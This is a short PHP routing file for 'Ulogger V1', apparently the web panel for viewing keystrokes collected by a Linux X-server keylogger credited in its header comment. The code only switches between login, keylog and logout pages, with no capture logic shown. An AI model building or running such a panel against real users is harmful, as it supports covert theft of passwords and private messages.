<?php
/**
 * Ulogger V1
 * Dev: https://twitter.com/atmon3r
 * Sources: https://framagit.org/tuxicoman/keylogger
 * C++ Keylogger pour Linux avec Xserver.
 * Ce code illustre le fait que chaque application X peut écouter l'ensemble des événements du clavier, même si elle n'a pas le focus.
 */
define("IN_LOGGER",true);
session_start(); 
include 'config.php';
 
switch (isset($_GET["page"])?$_GET["page"]:"") {
    case 'login':
        include 'pages/login.php';
        break;    
    case 'keylog':
        include 'pages/keylog.php';
        break;  
    case 'logout':
        unset($_SESSION['login']); 
        header("location:".$domaine."?page=login");
        break;    

    default:
        include 'pages/main.php'; 
        break;
}	
